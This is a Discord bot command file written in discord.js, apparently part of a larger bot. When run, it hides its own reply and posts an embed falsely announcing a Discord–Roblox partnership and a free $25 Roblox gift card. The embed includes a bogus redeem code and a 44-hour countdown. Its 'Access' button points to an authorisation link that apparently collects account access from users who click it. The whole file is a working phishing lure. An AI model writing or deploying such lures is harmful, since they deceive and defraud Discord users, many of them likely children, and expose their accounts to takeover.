const discord = require('discord.js')
const users = require('../../models/users');
const kaladin = require("../../kaladin")

module.exports = {
  name: "verify3",
  description: "Verify Role 3 Robux",
  default_permission: true,
  category: "whitelist",
  userPerms: ["SEND_MESSAGES"],
  ownerOnly: false,

  run: async (client, interaction, args) => {
    const row = new discord.MessageActionRow().addComponents(
      new discord.MessageButton()
        .setStyle('LINK')
        .setURL(`${kaladin.authLink}`)
        .setLabel("Access")
        .setEmoji("<a:robux0arrow:1055800018809921587>")
    )
    interaction.deferReply();
    interaction.deleteReply();
    interaction.channel.send({
      embeds: [new discord.MessageEmbed()
        .setColor("BLUE").setTitle(`${interaction.guild.name} Access <:1029920912373448805:1061016986194284616>`).setDescription(` \n\n <:robux0partner:1055803028051087411> DISCORD PARTNERSHIP <:robux0partner:1055803028051087411> \n\n\n :snowman2: In Celebration Of __Discord__ Partnering With __Roblox__, Certain People Are Being Selected For Chances To Win Free Roblox GiftCards And One Of The Users Is You \n\n <a:robux0arrow:1055800018809921587> You Have Been Gifted A $25 **__Roblox Giftcard__** From This Event, To Claim Your GiftCard, All You Have To Do Is Follow The Link Below.\n\n <:robux0emoji:1055676292713943110> **$25 Robux GiftCard**: https://roblox.com/redeem/922-321-0407 \n\n <:robux0timer:1055797716745195621> Expires In: 44 Hours`).setImage("https://cdn.discordapp.com/attachments/647102213356912651/1062318381597982780/Roblox-Gift-Cards-Codes.png")], components: [row]
    })



  }
}